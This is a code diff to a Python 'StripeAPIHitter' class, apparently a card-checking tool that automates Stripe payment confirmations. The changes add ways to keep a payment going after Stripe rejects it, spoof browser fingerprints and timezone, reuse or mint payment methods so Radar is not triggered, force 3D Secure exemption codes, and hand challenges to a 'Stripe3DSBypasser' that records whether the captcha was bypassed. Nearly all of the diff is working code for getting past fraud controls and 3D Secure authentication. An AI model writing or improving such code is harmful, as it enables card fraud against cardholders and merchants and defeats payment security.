@@ -1515,6 +1515,44 @@ class StripeAPIHitter:
                 # If the scraped amount was slightly off (taxes/shipping) and caused a mismatch, instantly retry without the constraint
                 err_code = confirm_json.get('error', {}).get('code')
                 err_msg = confirm_json.get('error', {}).get('message', '') or ''
+
+                # ── RESOURCE_MISSING RECOVERY ────────────────────────────────────────────
+                # Stripe rejects /payment_pages/{cs}/confirm with resource_missing when the
+                # session already has an active payment_intent in requires_action state
+                # (i.e. the link was hit before and 3DS was triggered but never resolved).
+                # Fix: GET the session state, extract the live PI, rewrite confirm_json so
+                # the downstream requires_action / 3DS pipeline processes it directly.
+                if err_code == 'resource_missing' and self.cs_live and self.cs_live.startswith('cs_'):
+                    try:
+                        _sess_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}?key={self.pk_live}&expand[]=payment_intent&expand[]=setup_intent"
+                        _sess_hdr = headers.copy()
+                        _sess_hdr.pop('Idempotency-Key', None)
+                        _sess_res = await loop.run_in_executor(None, lambda: _cffi_session.get(
+                            _sess_url, headers=_sess_hdr, timeout=12))
+                        _sess_json = _sess_res.json()
+                        _live_pi = _sess_json.get('payment_intent') or {}
+                        _live_si = _sess_json.get('setup_intent') or {}
+                        _live_obj = _live_pi if isinstance(_live_pi, dict) and _live_pi.get('id') else (_live_si if isinstance(_live_si, dict) else {})
+                        _live_status = _live_obj.get('status') if isinstance(_live_obj, dict) else None
+                        print(f"[DEBUG RECOVERY] cs session status={_sess_json.get('status')} pi_status={_live_status}")
+
+                        if _live_status in ('requires_action', 'requires_source_action', 'requires_payment_method'):
+                            # Rebuild confirm_json so the existing 3DS pipeline can process it
+                            confirm_json = _sess_json
+                            err_code = None
+                            err_msg = ''
+                            # Also expose status at top-level so the status routing below picks it up
+                            if 'status' not in confirm_json:
+                                confirm_json['status'] = _live_status
+                        elif _live_status == 'succeeded':
+                            result['success'] = True
+                            result['decline_code'] = None
+                            result['raw_response'] = _sess_json
+                            result['response_time'] = time.time() - start
+                            return result
+                    except Exception as _rmex:
+                        print(f"[DEBUG RECOVERY] resource_missing GET failed: {_rmex}")
+                # ─────────────────────────────────────────────────────────────────────────
                 
                 # Payment method missing error bypass (individual_name_required)
                 if err_code == 'individual_name_required' or 'individual_name_required' in err_msg:
@@ -1869,8 +1907,8 @@ class StripeAPIHitter:
                                         _top_rqdata = _sess_rqdata
                                         _top_sitekey = confirm_json.get('site_key') or confirm_json.get('hcaptcha_site_key')
 
-                                # 3. Link settings: hcaptcha_rqdata in link_settings block
-                                if not captcha_triggered:
+                                 # 3. Link settings: hcaptcha_rqdata in link_settings block
+                                if not captcha_triggered and _is_waf_gate:
                                     _ls = confirm_json.get('link_settings') or {}
                                     _ls_rqdata = _ls.get('hcaptcha_rqdata')
                                     if _ls_rqdata:
@@ -2159,17 +2197,20 @@ class StripeAPIHitter:
                                         _intent_ep = "setup_intents" if _is_setup else "payment_intents"
                                         _target_confirm_url = f"https://api.stripe.com/v1/{_intent_ep}/{pi}/confirm" if (pi and client_secret) else confirm_url
 
-                                        fresh_pm_data = pm_data.copy()
-                                        fresh_pm_headers = headers.copy()
-                                        fresh_pm_headers["Idempotency-Key"] = str(uuid.uuid4())
-                                        try:
-                                            fresh_pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(
-                                                pm_url, headers=fresh_pm_headers, data=fresh_pm_data, timeout=30))
-                                            fresh_pm_json = fresh_pm_res.json()
-                                            if fresh_pm_json.get('id'):
-                                                pm_id = fresh_pm_json['id']
-                                        except Exception:
-                                            pass  # keep existing pm_id as fallback
+                                        # Recipe 2 Fix: Only mint a fresh PM if we have a valid captcha token to reset Radar session.
+                                        # Otherwise reuse original pm_id to prevent mid-intent PM swapping that triggers issuer challenge.
+                                        if _hcaptcha_token:
+                                            fresh_pm_data = pm_data.copy()
+                                            fresh_pm_headers = headers.copy()
+                                            fresh_pm_headers["Idempotency-Key"] = str(uuid.uuid4())
+                                            try:
+                                                fresh_pm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(
+                                                    pm_url, headers=fresh_pm_headers, data=fresh_pm_data, timeout=30))
+                                                fresh_pm_json = fresh_pm_res.json()
+                                                if fresh_pm_json.get('id'):
+                                                    pm_id = fresh_pm_json['id']
+                                            except Exception:
+                                                pass
 
                                         reconfirm_data = {
                                             "payment_method": pm_id,
@@ -2242,6 +2283,9 @@ class StripeAPIHitter:
                                     source = pi
 
                                 if source:
+                                    # Recipe 3 Fix: Ensure tz_id has a safe integer fallback
+                                    tz_id = tz_offset if 'tz_offset' in locals() and isinstance(tz_offset, int) else -300
+
                                     # STAGE 1: 3DS2 EMV Exemption Matrix Sweep (01, 04, 05, 02, U/01, N/03)
                                     auth_headers = {
                                         "accept": "application/json",
@@ -2311,7 +2355,7 @@ class StripeAPIHitter:
                                             "browserColorDepth": profile.get("color_depth", "24"),
                                             "browserScreenHeight": profile.get("screen_height", "1080"),
                                             "browserScreenWidth": profile.get("screen_width", "1920"),
-                                            "browserTZ": str(tz_id) if isinstance(tz_id, int) else "-300",
+                                            "browserTZ": str(tz_id),
                                             "browserUserAgent": auth_headers["user-agent"]
                                         }
                                         auth_url = "https://api.stripe.com/v1/3ds2/authenticate"
@@ -2324,7 +2368,7 @@ class StripeAPIHitter:
                                             "one_click_authn_device_support[spc_eligible]": "false",
                                             "one_click_authn_device_support[webauthn_eligible]": "false",
                                             "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
-                                            "key": pk
+                                            "key": self.pk_live
                                         }
                                         if _tds_server_trans_id:
                                             auth_data["three_ds_server_trans_id"] = _tds_server_trans_id
@@ -2358,7 +2402,7 @@ class StripeAPIHitter:
                                                         acs_url, data={"creq": creq}, headers=acs_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                                     
                                                     comp_url = "https://api.stripe.com/v1/3ds2/challenge/complete"
-                                                    comp_data = {"source": source, "key": pk}
+                                                    comp_data = {"source": source, "key": self.pk_live}
                                                     if acs_resp and acs_resp.status_code == 200:
                                                         import re as _re_cres
                                                         cres_match = _re_cres.search(r'name=["\']cres["\']\s+value=["\']([^"\']+)["\']', acs_resp.text, _re_cres.I)
@@ -2394,7 +2438,7 @@ class StripeAPIHitter:
                                 if processed_auth:
                                     is_setup = is_setup_intent or (isinstance(pi, str) and 'seti' in pi)
                                     intent_endpoint = "setup_intents" if is_setup else "payment_intents"
-                                    poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
+                                    poll_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
                                     poll_headers = {
                                         "accept": "application/json",
                                         "origin": "https://js.stripe.com",
@@ -2404,6 +2448,7 @@ class StripeAPIHitter:
                                         poll_headers["Stripe-Account"] = self.stripe_account
                                         
                                     # Polling retry loop (up to 3 attempts with 1.5s delay)
+                                    # Recipe 5 Fix: Include challenge_required in active polling state
                                     status_2 = None
                                     poll_json = {}
                                     for poll_idx in range(3):
@@ -2414,12 +2459,13 @@ class StripeAPIHitter:
                                         status_2 = poll_json.get('status')
                                         if status_2 in ['succeeded', 'requires_capture', 'complete']:
                                             break
-                                        if status_2 not in ['requires_action', 'requires_source_action']:
+                                        if status_2 not in ['requires_action', 'requires_source_action', 'challenge_required']:
                                             break
                                         await asyncio.sleep(1.5)
                                     
                                     # Fallback Exemption Re-confirm if still requires_action
-                                    if status_2 in ['requires_action', 'requires_source_action'] and pi and client_secret:
+                                    # Recipe 4 Fix: Ensure self.pk_live is passed consistently
+                                    if status_2 in ['requires_action', 'requires_source_action', 'challenge_required'] and pi and client_secret:
                                         try:
                                             fallback_confirm_url = f"https://api.stripe.com/v1/{intent_endpoint}/{pi}/confirm"
                                             fallback_data = {
@@ -2427,7 +2473,7 @@ class StripeAPIHitter:
                                                 "expected_payment_method_type": "card",
                                                 "payment_method_options[card][mit_exemption][reason]": "low_value",
                                                 "use_stripe_sdk": "false",
-                                                "key": pk,
+                                                "key": self.pk_live,
                                                 "client_secret": client_secret
                                             }
                                             if self.stripe_account:
@@ -2470,13 +2516,18 @@ class StripeAPIHitter:
                                     result['3ds_attempted'] = True
                                     result['3ds_type'] = 'waf_challenge' if (_is_waf_gate and not _waf_cleared) else 'stripe_3ds2'
                                     result['captcha_bypassed'] = bool(_hcaptcha_token)
-                                    result['raw_response'] = poll_json
+
+                                    # Recipe 6 Fix: Normalize raw_response & explicitly pass pk_key/client_secret for Stage 3
+                                    _s3_raw = poll_json.get('payment_intent') or poll_json.get('setup_intent') or poll_json
+                                    result['raw_response'] = _s3_raw if isinstance(_s3_raw, dict) else poll_json
+                                    result['pk_key'] = self.pk_live
+                                    if client_secret:
+                                        result['client_secret'] = client_secret
 
                                     # STAGE 3: Stripe3DSBypasser standalone resolver (friend's engine)
                                     # Fires when the exemption sweep above still couldn't resolve —
                                     # passes the full raw_response into the ACS/redirect resolver.
                                     try:
-                                        result['pk_key'] = pk
                                         _bypass_result = await Stripe3DSBypasser.resolve_3ds(
                                             result=result,
                                             proxy_data=proxy_data,
